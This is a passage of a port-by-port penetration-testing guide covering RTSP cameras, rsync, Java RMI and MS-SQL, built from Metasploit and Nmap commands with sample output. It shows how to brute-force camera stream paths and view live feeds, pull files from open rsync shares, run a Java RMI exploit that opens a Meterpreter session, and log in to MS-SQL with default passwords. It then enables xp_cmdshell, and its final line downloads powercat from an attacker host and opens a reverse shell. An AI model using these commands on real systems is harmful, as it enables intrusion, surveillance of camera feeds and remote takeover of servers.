<span class="go">|_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN</span>
<span class="go">Service Info: Device: webcam</span>
</pre></div>
</div>
</section>
<section id="rtsp-url-brute">
<h4>rtsp-url-brute<a class="headerlink" href="#rtsp-url-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.</p>
<p>RTSP URL Brute Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Nmap scan report for 10.152.77.206</span>
<span class="go">Host is up (0.00047s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">554/tcp open  rtsp</span>
<span class="go">| rtsp-url-brute:</span>
<span class="go">|   Discovered URLs</span>
<span class="go">|     rtsp://10.152.77.206/media/video1</span>
<span class="go">|_    rtsp://10.152.77.206/video1</span>
<span class="go">Once you have this, just execute mplayer to watch the live feed</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mplayer &lt;url&gt;</span>
<span class="go">for example: mplayer rtsp://10.152.77.206/media/video1</span>
</pre></div>
</div>
</section>
</section>
<section id="id46">
<h3>Other<a class="headerlink" href="#id46" title="Link to this heading"></a></h3>
<section id="cameradar">
<h4>Cameradar<a class="headerlink" href="#cameradar" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://github.com/EtixLabs/cameradar">Cameradar</a> : An RTSP surveillance camera access multitool</p>
<p>Cameradar allows you to:</p>
<ul class="simple">
<li><p>Detect open RTSP hosts on any accessible target</p></li>
<li><p>Get their public info (hostname, port, camera model, etc.)</p></li>
<li><p>Launch automated dictionary attacks to get their stream route (for example /live.sdp)</p></li>
<li><p>Launch automated dictionary attacks to get the username and password of the cameras</p></li>
<li><p>Generate thumbnails from them to check if the streams are valid and to have a quick preview of their content</p></li>
<li><p>Try to create a Gstreamer pipeline to check if they are properly encoded</p></li>
<li><p>Print a summary of all the informations Cameradar could get</p></li>
</ul>
</section>
<section id="blogs">
<h4>Blogs<a class="headerlink" href="#blogs" title="Link to this heading"></a></h4>
<p>PenTest Partners have written a blog on <a class="reference external" href="https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/">Pwning CCTV cameras</a> where they mention various issues found with a DVR.</p>
</section>
</section>
</section>
<section id="port-873-rsync">
<span id="rsync-port-873"></span><h2>Port 873 - Rsync<a class="headerlink" href="#port-873-rsync" title="Link to this heading"></a></h2>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -p 873 -u -S rsync -R</span>
</pre></div>
</div>
<section id="id48">
<h3>Metasploit<a class="headerlink" href="#id48" title="Link to this heading"></a></h3>
<section id="list-rsync-modules">
<h4>List Rsync Modules<a class="headerlink" href="#list-rsync-modules" title="Link to this heading"></a></h4>
<p>An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and,  optionally, determines if the module requires a password to access.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/rsync/modules_list</span>
<span class="go">services -p 873 -u -S rsync -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:873 - 5 rsync modules found: OTG DATA, Server IMP Backup, Rajan Data, test, testing</span>
<span class="go">[*] Scanned 1 of 4 hosts (25% complete)</span>
<span class="go">[*] 10.10.xx.xx:873 - no rsync modules found</span>
<span class="go">[*] Scanned 2 of 4 hosts (50% complete)</span>
<span class="go">[*] Scanned 3 of 4 hosts (75% complete)</span>
<span class="go">[*] Scanned 4 of 4 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
</section>
<section id="id49">
<h3>Nmap<a class="headerlink" href="#id49" title="Link to this heading"></a></h3>
<section id="rsync-list-modules">
<h4>rsync-list-modules<a class="headerlink" href="#rsync-list-modules" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 873 XX.XX.XX.52 --script=rsync-list-modules</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-06 00:05 IST</span>
<span class="go">Nmap scan report for XX.XX.243.52</span>
<span class="go">Host is up (0.0088s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">873/tcp open  rsync</span>
<span class="go">| rsync-list-modules:</span>
<span class="go">|   mail</span>
<span class="go">|   varlib</span>
<span class="go">|   etc</span>
<span class="go">|   net</span>
<span class="go">|   dar</span>
<span class="go">|   usrlocal</span>
<span class="go">|   varlog</span>
<span class="go">|   var</span>
<span class="go">|_  root</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds</span>
</pre></div>
</div>
</section>
</section>
<section id="id50">
<h3>Other<a class="headerlink" href="#id50" title="Link to this heading"></a></h3>
<section id="rsync">
<h4>rsync<a class="headerlink" href="#rsync" title="Link to this heading"></a></h4>
<p>How to test your rsync setup:</p>
<p>List the available shares by running (may require a password)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync rsync://share@your-ip-or-hostname/</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync rsync://etc@XX.XX.XX.52</span>
<span class="go">mail</span>
<span class="go">varlib</span>
<span class="go">etc</span>
<span class="go">net</span>
<span class="go">dar</span>
<span class="go">usrlocal</span>
<span class="go">varlog</span>
<span class="go">var</span>
<span class="go">root</span>
</pre></div>
</div>
<p>After entering your password, rsync should now give a file listing</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync rsync://pub@your-ip-or-hostname/pub/</span>
</pre></div>
</div>
<p>We may get access denied because of the IP address restrictions</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync rsync://etc@XX.XX.XX.52/mail</span>
<span class="go">@ERROR: access denied to mail from unknown (XX.4.XX.XX)</span>
<span class="go">rsync error: error starting client-server protocol (code 5) at main.c(1653) [Receiver=3.1.1]</span>
</pre></div>
</div>
<p>Run:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync -v --progress --partial rsync://pub@your-ip-or-hostname/pub/someFile</span>

<span class="gp gp-VirtualEnv">(you can abbreviate --partial --progress as -P)</span><span class="go">. Your file should now be downloading.</span>
</pre></div>
</div>
<p>Run:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsync -aPv rsync://pub@your-ip-or-hostname/pub/someDirectory .</span>
<span class="go">Your directory should now be downloading</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-1099-java-rmi">
<span id="java-rmi-port-1099"></span><h2>Port 1099 - Java RMI<a class="headerlink" href="#port-1099-java-rmi" title="Link to this heading"></a></h2>
<section id="id51">
<h3>Metasploit<a class="headerlink" href="#id51" title="Link to this heading"></a></h3>
<section id="java-rmi-server-insecure-endpoint-code-execution-scanner">
<h4>Java RMI Server Insecure Endpoint Code Execution Scanner<a class="headerlink" href="#java-rmi-server-insecure-endpoint-code-execution-scanner" title="Link to this heading"></a></h4>
<p>Detects RMI endpoints:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/misc/java_rmi_server</span>
<span class="go">services -u -p 1099 -S Java -R</span>
</pre></div>
</div>
<p>Failed output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 172.30.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Disabled</span>
</pre></div>
</div>
<p>Successful output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 192.168.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Enabled</span>
</pre></div>
</div>
<p>and then use</p>
</section>
<section id="java-rmi-server-insecure-default-configuration-java-code-execution">
<h4>Java RMI Server Insecure Default Configuration Java Code Execution<a class="headerlink" href="#java-rmi-server-insecure-default-configuration-java-code-execution" title="Link to this heading"></a></h4>
<p>Module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use exploit/multi/misc/java_rmi_server</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use exploit/multi/misc/java_rmi_server</span>
<span class="go">msf exploit(java_rmi_server) &gt; set rhost 192.168.xx.xx</span>
<span class="go">rhost =&gt; 192.168.xx.xx</span>
<span class="go">msf exploit(java_rmi_server) &gt; run</span>

<span class="go">[*] Started reverse TCP handler on 192.168.xx.xx:4444</span>
<span class="go">[*] Using URL: http://0.0.xx.xx:8080/LAWVrAFTItH7N</span>
<span class="go">[*] Local IP: http://192.168.xx.xx:8080/LAWVrAFTItH7N</span>
<span class="go">[*] Server started.</span>
<span class="go">[*] 192.168.xx.xx:1099 - Sending RMI Header...</span>
<span class="go">[*] 192.168.xx.xx:1099 - Sending RMI Call...</span>
<span class="go">[*] 192.168.xx.xx     java_rmi_server - Replied to request for payload JAR</span>
<span class="go">[*] Sending stage (45741 bytes) to 192.168.xx.xx</span>
<span class="go">[*] Meterpreter session 1 opened (192.168.xx.xx:4444 -&gt; 192.168.7.87:3899) at 2016-05-03 18:24:53 +0530</span>
<span class="go">[-] Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn&#39;t get a payload request</span>
<span class="go">[*] Server stopped.</span>
</pre></div>
</div>
<p>Here’s a video of Mubix exploiting it from  Metasploit Minute <a class="reference external" href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute">Exploitation using java rmi service</a></p>
</section>
</section>
<section id="id52">
<h3>Nmap<a class="headerlink" href="#id52" title="Link to this heading"></a></h3>
<section id="rmi-vuln-classloader">
<h4>rmi-vuln-classloader<a class="headerlink" href="#rmi-vuln-classloader" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-04 00:04 IST</span>
<span class="go">Nmap scan report for 192.168.xx.xx</span>
<span class="go">Host is up (0.0011s latency).</span>
<span class="go">PORT     STATE SERVICE</span>
<span class="go">1099/tcp open  rmiregistry</span>
<span class="go">| rmi-vuln-classloader:</span>
<span class="go">|   VULNERABLE:</span>
<span class="go">|   RMI registry default configuration remote code execution vulnerability</span>
<span class="go">|     State: VULNERABLE</span>
<span class="go">|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.</span>
<span class="go">|</span>
<span class="go">|     References:</span>
<span class="go">|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-1433-ms-sql">
<span id="ms-sql-port-1443"></span><h2>Port 1433 - MS-SQL<a class="headerlink" href="#port-1433-ms-sql" title="Link to this heading"></a></h2>
<section id="id53">
<h3>Metasploit<a class="headerlink" href="#id53" title="Link to this heading"></a></h3>
<p><strong>MS-SQL</strong> is really vast multiple <strong>metasploit</strong> modules and blogs existing on the internet, Let’s check <strong>Metasploit Modules</strong> one by one.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator</span>
<span class="go">auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</span>
<span class="go">auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration</span>
<span class="go">auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration</span>
<span class="go">auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner</span>
<span class="go">auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner</span>
<span class="go">auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS</span>
<span class="go">auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS</span>
<span class="go">auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution</span>
<span class="go">auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data</span>
<span class="go">auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder</span>
<span class="go">auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer</span>
<span class="go">auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer</span>
<span class="go">auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query</span>
<span class="go">auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File</span>
<span class="go">auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)</span>
<span class="go">auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector</span>
<span class="go">auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump</span>
<span class="go">auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility</span>
<span class="go">auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility</span>
<span class="go">auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump</span>
</pre></div>
</div>
<section id="mssql-ping-utility">
<h4>MSSQL Ping Utility<a class="headerlink" href="#mssql-ping-utility" title="Link to this heading"></a></h4>
<p>Queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mssql/mssql_ping</span>
<span class="go">services -p 1433 -R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] SQL Server information for 10.10.xx.xx:</span>
<span class="go">[+]    ServerName      = SAPBWBI</span>
<span class="go">[+]    InstanceName    = BOE140</span>
<span class="go">[+]    IsClustered     = No</span>
<span class="go">[+]    Version         = 10.0.xx.xx</span>
<span class="go">[+]    tcp             = 50623</span>
<span class="go">[+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query</span>
<span class="go">[*] SQL Server information for 10.10.xx.xx:</span>
<span class="go">[+]    ServerName      = MANGOOSE</span>
<span class="go">[+]    InstanceName    = MSSQLSERVER</span>
<span class="go">[+]    IsClustered     = No</span>
<span class="go">[+]    Version         = 11.0.xx.xx</span>
<span class="go">[+]    tcp             = 1433</span>
<span class="go">[*] SQL Server information for 10.10.xx.xx:</span>
<span class="go">[+]    ServerName      = MHE-DMP</span>
<span class="go">[+]    InstanceName    = MSSQLSERVER</span>
<span class="go">[+]    IsClustered     = No</span>
<span class="go">[+]    Version         = 11.0.xx.xx</span>
<span class="go">[+]    tcp             = 1433</span>
<span class="go">[*] SQL Server information for 10.10.xx.xx:</span>
<span class="go">[+]    ServerName      = MHE-DMP</span>
<span class="go">[+]    InstanceName    = MHE_DMP_LIVE</span>
<span class="go">[+]    IsClustered     = No</span>
<span class="go">[+]    Version         = 11.0.xx.xx</span>
<span class="go">[+]    tcp             = 53029</span>
</pre></div>
</div>
<p>After discovering the ms-sql instances, we can check if their are any default passwords.</p>
</section>
<section id="mssql-login-utility">
<h4>MSSQL Login Utility<a class="headerlink" href="#mssql-login-utility" title="Link to this heading"></a></h4>
<p>Let’s see if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as <a class="reference external" href="mailto:company&#37;&#52;&#48;123">company<span>&#64;</span>123</a> etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mssql/mssql_login</span>
<span class="go">set Password company@123</span>
<span class="go">services -p 1433 -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:1433 - MSSQL - Starting authentication scanner.</span>
<span class="go">[+] 10.10.xx.xx:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:company@123</span>
<span class="go">[-] 10.10.xx.xx:1433 MSSQL - LOGIN FAILED: WORKSTATION\sa:company@123 (Incorrect:)</span>
</pre></div>
</div>
<p>Once, we have the credentials to the SQL Server we can use</p>
</section>
<section id="microsoft-sql-server-configuration-enumerator">
<h4>Microsoft SQL Server Configuration Enumerator<a class="headerlink" href="#microsoft-sql-server-configuration-enumerator" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/mssql/mssql_enum</span>
<span class="go">set rhost 10.10.xx.xx</span>
<span class="go">set password company@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Running MS SQL Server Enumeration...</span>
<span class="go">[*] Version:</span>
<span class="go">[*]    Microsoft SQL Server 2012 - 11.0.xx.xx (X64)</span>
<span class="go">[*]            Feb 10 2012 19:39:15</span>
<span class="go">[*]            Copyright (c) Microsoft Corporation</span>
<span class="go">[*]            Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)</span>
<span class="go">[*] Configuration Parameters:</span>
<span class="go">[*]    C2 Audit Mode is Not Enabled</span>
<span class="go">[*]    xp_cmdshell is Enabled</span>
<span class="go">[*]    remote access is Enabled</span>
<span class="go">[*]    allow updates is Not Enabled</span>
<span class="go">[*]    Database Mail XPs is Not Enabled</span>
<span class="go">[*]    Ole Automation Procedures are Not Enabled</span>
<span class="go">[*] Databases on the server:</span>
<span class="go">[*]    Database name:master</span>
<span class="go">[*]    Database Files for master:</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\master.mdf</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\mastlog.ldf</span>
<span class="go">[*]    Database name:tempdb</span>
<span class="go">[*]    Database Files for tempdb:</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\tempdb.mdf</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\templog.ldf</span>
<span class="go">[*]    Database name:model</span>
<span class="go">[*]    Database Files for model:</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\model.mdf</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\modellog.ldf</span>
<span class="go">[*]    Database name:msdb</span>
<span class="go">[*]    Database Files for msdb:</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf</span>
<span class="go">[*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf</span>
<span class="go">[*]    Database name:ReportServer</span>
<span class="go">[*]    Database Files for ReportServer:</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer.mdf</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer_log.ldf</span>
<span class="go">[*]    Database name:ReportServerTempDB</span>
<span class="go">[*]    Database Files for ReportServerTempDB:</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB.mdf</span>
<span class="go">[*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB_log.ldf</span>
<span class="go">[*] System Logins on this Server:</span>
<span class="go">[*]    sa</span>
<span class="gp">[*]    #</span><span class="c1">#MS_SQLResourceSigningCertificate##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_SQLReplicationSigningCertificate##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_SQLAuthenticatorCertificate##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicySigningCertificate##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_SmoExtendedSigningCertificate##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyEventProcessingLogin##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyTsqlExecutionLogin##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_AgentSigningCertificate##</span>
<span class="go">[*]    EXAMPLE\Administrator</span>
<span class="go">[*]    OTH-EXAMPLE\altadmin</span>
<span class="go">[*]    NT SERVICE\SQLWriter</span>
<span class="go">[*]    NT SERVICE\Winmgmt</span>
<span class="go">[*]    NT Service\MSSQLSERVER</span>
<span class="go">[*]    NT AUTHORITY\SYSTEM</span>
<span class="go">[*]    NT SERVICE\SQLSERVERAGENT</span>
<span class="go">[*]    NT SERVICE\ReportServer</span>
<span class="go">[*] Disabled Accounts:</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyEventProcessingLogin##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyTsqlExecutionLogin##</span>
<span class="go">[*] No Accounts Policy is set for:</span>
<span class="go">[*]    All System Accounts have the Windows Account Policy Applied to them.</span>
<span class="go">[*] Password Expiration is not checked for:</span>
<span class="go">[*]    sa</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyEventProcessingLogin##</span>
<span class="gp">[*]    #</span><span class="c1">#MS_PolicyTsqlExecutionLogin##</span>
<span class="go">[*] System Admin Logins on this Server:</span>
<span class="go">[*]    sa</span>
<span class="go">[*]    EXAMPLE\Administrator</span>
<span class="go">[*]    OTH-EXAMPLE\altadmin</span>
<span class="go">[*]    NT SERVICE\SQLWriter</span>
<span class="go">[*]    NT SERVICE\Winmgmt</span>
<span class="go">[*]    NT Service\MSSQLSERVER</span>
<span class="go">[*]    NT SERVICE\SQLSERVERAGENT</span>
<span class="go">[*] Windows Logins on this Server:</span>
<span class="go">[*]    EXAMPLE\Administrator</span>
<span class="go">[*]    OTH-EXAMPLE\altadmin</span>
<span class="go">[*]    NT SERVICE\SQLWriter</span>
<span class="go">[*]    NT SERVICE\Winmgmt</span>
<span class="go">[*]    NT Service\MSSQLSERVER</span>
<span class="go">[*]    NT AUTHORITY\SYSTEM</span>
<span class="go">[*]    NT SERVICE\SQLSERVERAGENT</span>
<span class="go">[*]    NT SERVICE\ReportServer</span>
<span class="go">[*] Windows Groups that can logins on this Server:</span>
<span class="go">[*]    No Windows Groups where found with permission to login to system.</span>
<span class="go">[*] Accounts with Username and Password being the same:</span>
<span class="go">[*]    No Account with its password being the same as its username was found.</span>
<span class="go">[*] Accounts with empty password:</span>
<span class="go">[*]    No Accounts with empty passwords where found.</span>
<span class="go">[*] Stored Procedures with Public Execute Permission found:</span>
<span class="go">[*]    sp_replsetsyncstatus</span>
<span class="go">[*]    sp_replcounters</span>
<span class="go">[*]    sp_replsendtoqueue</span>
<span class="go">[*]    sp_resyncexecutesql</span>
<span class="go">[*]    sp_prepexecrpc</span>
<span class="go">[*]    sp_repltrans</span>
<span class="go">[*]    sp_xml_preparedocument</span>
<span class="go">[*]    xp_qv</span>
<span class="go">[*]    xp_getnetname</span>
<span class="go">[*]    sp_releaseschemalock</span>
<span class="go">[*]    sp_refreshview</span>
<span class="go">[*]    sp_replcmds</span>
<span class="go">[*]    sp_unprepare</span>
<span class="go">[*]    sp_resyncprepare</span>
<span class="go">[*]    sp_createorphan</span>
<span class="go">[*]    xp_dirtree</span>
<span class="go">[*]    sp_replwritetovarbin</span>
<span class="go">[*]    sp_replsetoriginator</span>
<span class="go">[*]    sp_xml_removedocument</span>
<span class="go">[*]    sp_repldone</span>
<span class="go">[*]    sp_reset_connection</span>
<span class="go">[*]    xp_fileexist</span>
<span class="go">[*]    xp_fixeddrives</span>
<span class="go">[*]    sp_getschemalock</span>
<span class="go">[*]    sp_prepexec</span>
<span class="go">[*]    xp_revokelogin</span>
<span class="go">[*]    sp_resyncuniquetable</span>
<span class="go">[*]    sp_replflush</span>
<span class="go">[*]    sp_resyncexecute</span>
<span class="go">[*]    xp_grantlogin</span>
<span class="go">[*]    sp_droporphans</span>
<span class="go">[*]    xp_regread</span>
<span class="go">[*]    sp_getbindtoken</span>
<span class="go">[*]    sp_replincrementlsn</span>
<span class="go">[*] Instances found on this server:</span>
<span class="go">[*]    MSSQLSERVER</span>
<span class="go">[*]    SQLEXPRESS</span>
<span class="go">[*] Default Server Instance SQL Server Service is running under the privilege of:</span>
<span class="go">[*]    NT Service\MSSQLSERVER</span>
<span class="go">[*] Instance SQLEXPRESS SQL Server Service is running under the privilege of:</span>
<span class="go">[*]    NT AUTHORITY\NETWORKSERVICE</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
<p>If the xp_cmdshell is disabled and we have sa credentials, we can enable it by executing the below code in <a class="reference external" href="https://dbeaver.jkiss.org/">dbeaver</a> as mentioned in <a class="reference external" href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option">xp_cmdshell Server Configuration Option</a></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-- To allow advanced options to be changed.</span>
<span class="go">EXEC sp_configure &#39;show advanced options&#39;, 1;</span>
<span class="go">GO</span>
<span class="go">-- To update the currently configured value for advanced options.</span>
<span class="go">RECONFIGURE;</span>
<span class="go">GO</span>
<span class="go">-- To enable the feature.</span>
<span class="go">EXEC sp_configure &#39;xp_cmdshell&#39;, 1;</span>
<span class="go">GO</span>
<span class="go">-- To update the currently configured value for this feature.</span>
<span class="go">RECONFIGURE;</span>
<span class="go">GO</span>
</pre></div>
</div>
<p>Next, we can execute command using</p>
</section>
<section id="microsoft-sql-server-xp-cmdshell-command-execution">
<h4>Microsoft SQL Server xp_cmdshell Command Execution<a class="headerlink" href="#microsoft-sql-server-xp-cmdshell-command-execution" title="Link to this heading"></a></h4>
<p>if xp_cmdshell is enabled and if the user has permissions.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/admin/mssql/mssql_exec</span>
<span class="go">set RHOst 10.10.xx.xx</span>
<span class="go">set password company@123</span>
<span class="go">set cmd ipconfig</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Windows IP Configuration</span>


<span class="go"> Ethernet adapter LAN:</span>

<span class="go">    Connection-specific DNS Suffix  . :</span>
<span class="go">    IPv4 Address. . . . . . . . . . . : 10.10.xx.xx</span>
<span class="go">    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx</span>
<span class="go">    Default Gateway . . . . . . . . . : 10.10.xx.xx</span>

<span class="go">  Ethernet adapter Local Area Connection 3:</span>

<span class="go">    Connection-specific DNS Suffix  . :</span>
<span class="go">    Link-local IPv6 Address . . . . . : fe80::798f:6cad:4f1e:c5fb%15</span>
<span class="go">    Autoconfiguration IPv4 Address. . : 169.254.xx.xx</span>
<span class="go">    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx</span>
<span class="go">    Default Gateway . . . . . . . . . :</span>

<span class="go"> Tunnel adapter isatap.{D295B095-19EB-436E-97D0-4D22486521CC}:</span>

<span class="go">    Media State . . . . . . . . . . . : Media disconnected</span>
<span class="go">    Connection-specific DNS Suffix  . :</span>

<span class="go"> Tunnel adapter isatap.{A738E25A-F5E3-4E36-8F96-6977E22136B6}:</span>

<span class="go">    Media State . . . . . . . . . . . : Media disconnected</span>
<span class="go">    Connection-specific DNS Suffix  . :</span>
</pre></div>
</div>
<p>At this point, we can probably use msf exploit/windows/mssql/mssql_payload or get a shell back with powercat or powershell-empire.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">EXEC xp_cmdshell &#39;powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.0.0.1:8080/powercat.ps1&quot;);powercat -c 10.0.0.1 -p 443 -e cmd&#39;</span>
</pre></div>
</div>
</section>
